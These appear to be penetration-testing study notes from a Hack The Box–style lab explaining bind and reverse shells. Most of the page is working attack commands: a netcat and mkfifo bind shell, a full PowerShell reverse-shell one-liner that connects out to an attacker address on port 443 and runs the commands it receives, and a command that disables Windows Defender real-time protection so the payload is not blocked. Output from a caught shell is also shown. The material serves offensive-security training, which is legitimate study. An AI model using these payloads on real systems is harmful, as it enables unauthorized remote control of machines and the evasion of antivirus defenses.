# 🤹‍♂️ Shell Basics

We can also find out what shell language is in use by viewing the environment variables using the `env` command

## Bind Shells

<figure><img src="../../../.gitbook/assets/image (1445).png" alt=""><figcaption><p>we  connect directly with the <code>IP address</code> and <code>port</code> listening on the target.</p></figcaption></figure>

Let's say this is the target and it's listening on a random port ->

```shell-session
Target@server:~$ nc -lvnp 7777
```

To connect to this target ->

```shell-session
ElFelixi0@htb[/htb]$ nc -nv 10.129.41.200 7777
```

This will not spawn a shell, it's just a Netcat TCP session we have established

To pop a shell we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.

Binding shell to TCP session ->

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

And then if we connect to our target ->

```shell-session
ElFelixi0@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```

## Reverse Shells

<figure><img src="../../../.gitbook/assets/image (1446).png" alt=""><figcaption><p>With a <code>reverse shell</code>, the attack box will have a listener running, and the target will need to initiate the connection.</p></figcaption></figure>

So we will start by listening on our attackbox ->

```shell-session
ElFelixi0@htb[/htb]$ sudo nc -lvnp 443
```

It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get to various websites throughout the workday. That said, a firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port because it's examining the contents of the network packets, not just the IP address and port.

On our target we can type in the following command ->

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

If we have an error message such as ->

```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

The `Windows Defender antivirus` (`AV`) software stopped the execution of the code.

**Disable AV**

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

And if we execute the code again we should see this on our attackbox ->

```shell-session
ElFelixi0@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

<figure><img src="../../../.gitbook/assets/image (1447).png" alt=""><figcaption></figcaption></figure>
